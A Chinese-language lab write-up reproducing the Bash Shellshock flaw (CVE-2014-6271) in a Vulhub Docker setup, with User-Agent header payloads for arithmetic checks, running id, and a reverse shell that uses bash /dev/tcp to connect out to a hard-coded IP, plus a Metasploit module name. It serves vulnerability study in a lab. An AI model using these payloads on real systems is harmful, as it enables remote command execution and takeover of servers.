ailx10说：这篇是我2024年9月写的。早在 2018 年做过 Shellshock，后来又在 Vulhub 里刷过，这次还是拿出来重新走了一遍。我先用能看清结果的小计算验证，再试命令和连接，也补了 Metasploit 的模块用法。同一个漏洞反复练，并不是结果又新鲜了，而是每次都能把以前含糊的地方补清一点，比如环境变量从哪来、CGI 怎样调用 Bash，以及算术扩展和命令替换到底有什么区别。这篇保留的，是这次重做时的步骤，不是说旧实验时间变成了现在。

---

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Bash Shellshock 破壳漏洞（CVE-2014-6271）环境搭建成功了

![](/notes-assets/648ad5ce02332da24b95.webp)

（1）数学运算

第一种样例使用 $((...)) 算术扩展；它与 $(...) 命令替换不同。

```
User-Agent: () { foo; }; echo;echo test for CVE-$((2000+14))-6271;
```

![](/notes-assets/056c2862cf2d42ffbade.webp)

另一种是`expr` 表达式的方式（注意有空格）

```
User-Agent: () { foo; }; echo;/bin/bash -c 'expr 1023 + 1'
```

![](/notes-assets/8a2d377a024efcfc179b.webp)

（2）命令执行

```
User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id
```

![](/notes-assets/38bcb48f334b71b4a65a.webp)

（3）反弹shell

```
User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /bin/bash -c "bash -i >& /dev/tcp/144.34.162.13/6666 0>&1"
```

![](/notes-assets/f2509d3cdb2e8b58287d.webp)

反弹shell成功

![](/notes-assets/c92f40b9237a769ddeab.webp)

（4）使用metasploit直接反弹shell

基本配置如下：

```
use multi/http/apache_mod_cgi_bash_env_exec
```

![](/notes-assets/7557166640197498ce34.webp)

反弹shell成功

![](/notes-assets/e7e492b69712bbaa492e.webp)
